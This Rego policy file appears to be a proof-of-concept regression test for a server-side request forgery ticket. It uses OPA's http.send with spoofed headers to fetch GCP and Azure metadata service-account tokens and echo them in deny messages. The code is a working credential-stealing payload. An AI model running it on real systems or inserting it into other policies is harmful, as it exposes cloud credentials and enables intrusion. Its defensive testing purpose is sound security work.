package nuon

# PRO-3595 PoC — SSRF to GCP and Azure instance metadata via OPA http.send.
#
# http.send lets the policy set arbitrary headers, which is what GCP and Azure
# metadata endpoints require as their (weak) anti-SSRF guard:
#   GCP:   Metadata-Flavor: Google
#   Azure: Metadata: true  (IMDS), and the WireServer at 168.63.129.16
#
# Note the ticket's fix item #5: publicnet.IsPublicIP currently returns true for
# 168.63.129.16 (Azure WireServer) even though probe_dial.go blocks it. The OPA
# fix closes this via http.send removal + AllowNet=[]; this policy documents the
# target so the publicnet merge can be regression-tested too.
#
# Expected behavior:
#   main (vulnerable): deny fires with whichever metadata endpoint is reachable.
#   fix branch:        compile FAILS with "undefined function http.send".

gcp_token := resp.raw_body if {
	resp := http.send({
		"method": "GET",
		"url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
		"headers": {"Metadata-Flavor": "Google"},
		"raise_error": false,
	})
}

azure_token := resp.raw_body if {
	resp := http.send({
		"method": "GET",
		"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
		"headers": {"Metadata": "true"},
		"raise_error": false,
	})
}

deny contains msg if {
	count(gcp_token) > 0
	msg := sprintf("PRO-3595 SSRF reached GCP metadata token endpoint: %s", [gcp_token])
}

deny contains msg if {
	count(azure_token) > 0
	msg := sprintf("PRO-3595 SSRF reached Azure IMDS token endpoint: %s", [azure_token])
}
